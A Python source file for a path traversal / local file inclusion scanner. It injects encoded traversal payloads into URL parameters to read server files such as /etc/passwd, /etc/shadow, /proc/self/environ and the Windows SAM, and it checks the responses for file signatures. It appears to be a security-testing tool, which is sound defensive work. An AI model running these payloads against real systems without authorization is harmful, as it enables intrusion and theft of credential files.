# janus/attack/path_traversal.py
"""
Path Traversal / Local File Inclusion (LFI) Scanner.

Tests for directory traversal vulnerabilities that could allow
attackers to read sensitive files from the server.
"""

import requests
from dataclasses import dataclass, field, asdict
from typing import Dict, List, Any, Optional
from datetime import datetime
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse


@dataclass
class PathTraversalFinding:
    """A path traversal finding."""
    endpoint: str
    parameter: str
    payload: str
    vulnerable: bool
    severity: str
    file_accessed: str
    evidence: str
    recommendation: str
    
    def to_dict(self) -> Dict:
        return asdict(self)


@dataclass
class PathTraversalReport:
    """Path traversal scan report."""
    target_url: str
    scan_time: str
    vulnerable_params: int
    total_params_tested: int
    findings: List[PathTraversalFinding] = field(default_factory=list)
    
    def to_dict(self) -> Dict:
        return {
            **asdict(self),
            'findings': [f.to_dict() for f in self.findings]
        }


class PathTraversalScanner:
    """
    Path Traversal / LFI Scanner.
    
    Tests for:
    - Basic directory traversal (../)
    - Encoded traversal (%2e%2e%2f)
    - Null byte injection
    - Wrapper bypasses
    """
    
    # Target files to check for (Unix)
    UNIX_FILES = [
        '/etc/passwd',
        '/etc/shadow',
        '/etc/hosts',
        '/proc/self/environ',
        '/proc/version',
        '/var/log/apache2/access.log',
        '/var/log/nginx/access.log',
    ]
    
    # Target files to check for (Windows)
    WINDOWS_FILES = [
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        'C:\\Windows\\win.ini',
        'C:\\Windows\\System32\\config\\SAM',
        'C:\\inetpub\\logs\\LogFiles',
    ]
    
    # Traversal payloads
    TRAVERSAL_PAYLOADS = [
        # Basic traversal
        '../',
        '..\\',
        '..//',
        '..\\\\',
        
        # Encoded
        '%2e%2e%2f',
        '%2e%2e/',
        '..%2f',
        '%2e%2e%5c',
        '..%5c',
        
        # Double encoding
        '%252e%252e%252f',
        '..%252f',
        
        # Unicode
        '..%c0%af',
        '..%c1%9c',
        
        # Null byte (legacy)
        '../..\x00',
        '....//....//....//....//....',
    ]
    
    # File content signatures for detection
    FILE_SIGNATURES = {
        '/etc/passwd': ['root:', '/bin/bash', '/bin/sh', 'nobody:'],
        '/etc/hosts': ['localhost', '127.0.0.1', '::1'],
        '/proc/version': ['Linux version', 'gcc version'],
        'win.ini': ['[fonts]', '[extensions]', '[files]'],
        'hosts': ['localhost', '127.0.0.1'],
    }
    
    def __init__(self, timeout: int = 10, depth: int = 8):
        self.timeout = timeout
        self.depth = depth  # How many ../ to try
    
    def scan(
        self,
        url: str,
        params: Optional[List[str]] = None,
        token: Optional[str] = None,
        os_type: str = "unix"  # unix or windows
    ) -> PathTraversalReport:
        """
        Scan for path traversal vulnerabilities.
        
        Args:
            url: Target URL
            params: Parameters to test (auto-detect if None)
            token: Authorization token
            os_type: Target OS type (unix/windows)
        
        Returns:
            PathTraversalReport
        """
        findings = []
        headers = {'Authorization': token} if token else {}
        
        # Auto-detect parameters
        if params is None:
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            params = list(query_params.keys())
            
            # Also look for common file parameters
            common_file_params = ['file', 'page', 'path', 'doc', 'document', 
                                 'folder', 'root', 'include', 'template', 'dir']
            for p in common_file_params:
                if p not in params:
                    params.append(p)
        
        target_files = self.UNIX_FILES if os_type == "unix" else self.WINDOWS_FILES
        
        for param in params:
            for target_file in target_files[:3]:  # Limit for speed
                finding = self._test_traversal(url, param, target_file, headers, os_type)
                if finding and finding.vulnerable:
                    findings.append(finding)
                    break  # One finding per param enough
        
        vulnerable_count = len(set(f.parameter for f in findings if f.vulnerable))
        
        return PathTraversalReport(
            target_url=url,
            scan_time=datetime.now().isoformat(),
            vulnerable_params=vulnerable_count,
            total_params_tested=len(params),
            findings=findings
        )
    
    def _test_traversal(
        self,
        url: str,
        param: str,
        target_file: str,
        headers: Dict,
        os_type: str
    ) -> Optional[PathTraversalFinding]:
        """Test traversal to reach a specific file."""
        
        for traversal in self.TRAVERSAL_PAYLOADS[:6]:  # Limit payloads
            for depth in range(1, self.depth + 1):
                # Build payload
                if os_type == "unix":
                    payload = (traversal * depth) + target_file.lstrip('/')
                else:
                    payload = (traversal * depth) + target_file.replace('C:\\', '').replace('\\', '/')
                
                result = self._make_request(url, param, payload, headers, target_file)
                if result:
                    return result
        
        return None
    
    def _make_request(
        self,
        url: str,
        param: str,
        payload: str,
        headers: Dict,
        target_file: str
    ) -> Optional[PathTraversalFinding]:
        """Make request and check for file content."""
        test_url = self._inject_payload(url, param, payload)
        
        try:
            response = requests.get(test_url, headers=headers, timeout=self.timeout)
            
            # Check for file signatures
            if self._check_file_content(response.text, target_file):
                # Find evidence
                evidence = self._extract_evidence(response.text, target_file)
                
                return PathTraversalFinding(
                    endpoint=url,
                    parameter=param,
                    payload=payload,
                    vulnerable=True,
                    severity='CRITICAL',
                    file_accessed=target_file,
                    evidence=evidence,
                    recommendation="Validate and sanitize file paths. Use allowlists for permitted files. Never use user input directly in file operations."
                )
                
        except Exception:
            pass
        
        return None
    
    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter."""
        parsed = urlparse(url)
        query_dict = parse_qs(parsed.query)
        query_dict[param] = [payload]
        
        new_query = urlencode(query_dict, doseq=True)
        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))
    
    def _check_file_content(self, response_text: str, target_file: str) -> bool:
        """Check if response contains expected file content."""
        response_lower = response_text.lower()
        
        for file_key, signatures in self.FILE_SIGNATURES.items():
            if file_key in target_file.lower():
                matches = sum(1 for sig in signatures if sig.lower() in response_lower)
                if matches >= 2:  # At least 2 signatures
                    return True
        
        return False
    
    def _extract_evidence(self, response_text: str, target_file: str) -> str:
        """Extract evidence snippet from response."""
        for file_key, signatures in self.FILE_SIGNATURES.items():
            if file_key in target_file.lower():
                for sig in signatures:
                    if sig.lower() in response_text.lower():
                        idx = response_text.lower().find(sig.lower())
                        start = max(0, idx - 10)
                        end = min(len(response_text), idx + 50)
                        return f"File content found: ...{response_text[start:end]}..."
        
        return "File content signatures detected in response"
    
    def quick_scan(
        self,
        url: str,
        param: str,
        token: Optional[str] = None
    ) -> Dict[str, Any]:
        """Quick scan of a single parameter."""
        report = self.scan(url, [param], token)
        
        return {
            "url": url,
            "parameter": param,
            "vulnerable": report.vulnerable_params > 0,
            "findings": [f.to_dict() for f in report.findings]
        }
